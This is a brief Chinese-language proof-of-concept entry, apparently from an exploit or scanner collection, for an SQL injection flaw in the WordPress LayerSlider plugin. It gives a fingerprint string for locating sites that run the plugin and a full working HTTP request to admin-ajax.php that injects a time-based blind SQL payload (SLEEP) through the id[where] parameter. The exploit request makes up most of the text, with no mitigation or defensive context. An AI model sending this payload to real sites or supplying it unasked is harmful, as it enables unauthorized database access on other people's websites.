# WordPressLayerSlider插件SQL注入漏洞

WordPress ｜ SQL注入 ｜ —
- **指纹**：`body="/wp-content/plugins/LayerSlider/"`
- **请求**：`GET /wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)and+(SELECT+6416+FROM+(SELECT(SLEEP(5)))nEiK)--+vqlq HTTP/1.1`
- **响应特征**：200